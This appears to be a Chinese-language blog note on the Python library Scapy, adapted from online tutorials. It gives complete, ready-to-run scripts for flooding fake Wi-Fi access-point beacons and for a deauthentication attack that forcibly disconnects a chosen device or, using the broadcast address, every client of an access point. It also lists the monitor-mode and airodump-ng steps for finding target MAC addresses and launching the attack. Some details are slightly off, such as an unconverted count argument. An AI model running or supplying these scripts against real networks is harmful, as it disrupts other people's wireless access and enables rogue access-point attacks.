---
title: scapy
date: 2019-12-10 19:35:51
categories: python
tags:
- python
- secure
- vm

---

# scapy

## 1. fake access point

### tip

1. 笔记本电脑或手机如何知道附近有哪些无线网络可用？

   实际上非常简单，无线接入点会不断向所有附近的无线设备发送信标帧，这些帧包含有关接入点的信息，例如SSID（名称），加密类型，MAC地址等。 

2.  本段将使用Scapy将信标帧发送到空中以成功伪造伪造的访问点

### 代码

1. 伪造一个(无密码)

   ```python
   from scapy.all import *
   #interface to use to send beacon frames, must be in monitor mode
   #接口用于发送信标帧，必须处于监控模式
   iface = "wlan0mon"
   # generate a random MAC address (built-in in scapy)
   sender_mac = RandMAC()
   # SSID (name of access point)
   ssid = "Test"
   # 802.11 frame
   dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
   # beacon layer
   beacon = Dot11Beacon()
   # putting ssid in the frame
   essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
   # stack all the layers and add a RadioTap
   frame = RadioTap()/dot11/beacon/essid
   # send the frame in layer 2 every 100 milliseconds forever
   # using the `iface` interface
   sendp(frame, inter=0.1, iface=iface, loop=1)
   ```

2. 伪造一个(有加密方式)

   ```python
   from scapy.all import *
   #interface to use to send beacon frames, must be in monitor mode
   #接口用于发送信标帧，必须处于监控模式
   iface = "wlan0mon"
   # generate a random MAC address (built-in in scapy)
   sender_mac = RandMAC()
   # SSID (name of access point)
   ssid = "Test"
   # 802.11 frame
   dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
   # beacon layer(cap为空字符串时,就是无加密)
   beacon = Dot11Beacon(cap="ESS+privacy")
   # putting ssid in the frame
   essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
   # stack all the layers and add a RadioTap
   frame = RadioTap()/dot11/beacon/essid
   # send the frame in layer 2 every 100 milliseconds forever
   # using the `iface` interface
   sendp(frame, inter=0.1, iface=iface, loop=1)
   ```

3. 伪造多个

```python
from scapy.all import *
from threading import Thread
from faker import Faker

def send_beacon(ssid, mac, infinite=True):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # ESS+privacy to appear as secured on some devices
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)

if __name__ == "__main__":
    # number of access points
    n_ap = 5
    iface = "wlan0mon"
    # generate random SSIDs and MACs
    faker = Faker()
    ssids_macs = [ (faker.name(), faker.mac_address()) for i in range(n_ap) ]
    for ssid, mac in ssids_macs:
        Thread(target=send_beacon, args=(ssid, mac)).start()
```

 我在这里所做的全部工作是将前面的代码行包装到一个函数中，并使用faker package生成随机MAC地址和SSID ，然后为每个访问点启动一个单独的线程，一旦执行脚本，该接口将发送5个信标每100毫秒（至少从理论上来说），这将导致出现五个伪造的访问点 

3. 完整代码

```python
from scapy.all import *
from threading import Thread
from faker import Faker

def send_beacon(ssid, mac, infinite=True):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # type=0:       management frame
    # subtype=8:    beacon frame
    # addr1:        MAC address of the receiver
    # addr2:        MAC address of the sender
    # addr3:        MAC address of the Access Point (AP)

    # beacon frame
    beacon = Dot11Beacon()
    
    # we inject the ssid name
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    
    # stack all the layers and add a RadioTap
    frame = RadioTap()/dot11/beacon/essid

    # send the frame
    if infinite:
        sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)
    else:
        sendp(frame, iface=iface, verbose=0)

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Fake Access Point Generator")
    parser.add_argument("interface", default="wlan0mon", help="The interface to send beacon frames with, must be in monitor mode")
    parser.add_argument("-n", "--access-points", dest="n_ap", help="Number of access points to be generated")
    args = parser.parse_args()
    n_ap = args.n_ap
    iface = args.interface
    # generate random SSIDs and MACs
    faker = Faker()
    ssids_macs = [ (faker.name(), faker.mac_address()) for i in range(n_ap) ]
    for ssid, mac in ssids_macs:
        Thread(target=send_beacon, args=(ssid, mac)).start()
```



### 伪造

1. 杀进程

```
airmon-ng check kill
```

2. 开启监听模式

```
airmon-ng start wlan0
```

3.  创建一个802.11帧 (执行代码)

- **type = 0：**  表示是管理帧。
- **subtype = 8：**  表示该管理帧是信标帧。
- **addr1：** 是指目标MAC地址，即接收方的MAC地址，如果您只想显示此伪造的接入点，则在此处使用广播地址（“ ff：ff：ff：ff：ff：ff：ff”）在目标设备中，您可以使用目标的MAC地址。

- **addr2：**源MAC地址，发送方的MAC地址。
- **addr3：**接入点的MAC地址。

所以我们应该使用addr2和addr3相同的MAC地址，这是因为发送者是访问点！

我们使用ssid信息创建信标帧，然后将它们全部堆叠在一起并使用sendp（）函数发送它们。



##  2. Deauth Attack

### tip

1. 如何使用Scapy来踢出您实际上不属于Python的特定网络中的设备?

   这可以通过使用处于监视模式的网络设备在空中发送取消身份验证帧来完成。 

2.  攻击者可以随时用受害计算机的欺骗性MAC地址将取消身份验证帧发送到无线访问点，从而使该访问点对该用户进行取消身份验证。 

3.  scapy有一个数据包类Dot11Deauth（）可以满足我们的要求，它以802.11原因码作为参数，我们现在选择值7 

### 代码

1. 初级

```python
from scapy.all import *
target_mac = "00:ae:fa:81:e2:5e"
gateway_mac = "e8:94:f6:c4:97:3f"
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# send the packet
sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
```

这基本上是访问点请求从目标设备撤消身份验证的原因，这就是为什么我们将目标MAC地址设置为目标设备的MAC地址，将源MAC地址设置为访问点的MAC地址，然后我们将堆叠帧发送100次的原因0.1s，这将导致取消身份验证10秒钟。

您还可以将“ ff：ff：ff：ff：ff：ff：ff”（广播MAC地址）设置为addr1，这将导致完全拒绝服务，因为没有设备可以连接到该访问点，因此非常有害！

2. 完整代码

```python
from scapy.all import *

def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
    parser.add_argument("target", help="Target MAC address to deauthenticate.")
    parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms", default=0.1)
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0mon'", default="wlan0mon")
    parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")

    args = parser.parse_args()
    target = args.target
    gateway = args.gateway
    count = int(args.count)
    interval = float(args.interval)
    iface = args.iface
    verbose = args.verbose
    if count == 0:
        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
    else:
        loop = 0
    # printing some info messages"
    if verbose:
        if count:
            print(f"[+] Sending {count} frames every {interval}s...")
        else:
            print(f"[+] Sending frames every {interval}s for ever...")

    deauth(target, gateway, interval, count, loop, iface, verbose)
```



### 攻击

1. 开启监视模式

```
sudo airmon-ng start wlan0
```

 我的网络接口称为wlan0，但是您应该使用正确的网络接口名称。 

2.  获得网关和目标MAC地址 

```
airodump-ng wlan0mon
```

 wlan0mon是我在监视方式下的网络接口名称

 此命令将继续监听802.11信标帧，并为您以及附近的连接设备安排Wi-Fi网络。 

3. 执行代码



## 网址集合

1. fake ap: https://www.thepythoncode.com/article/create-fake-access-points-scapy 

2. deauth attack: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy 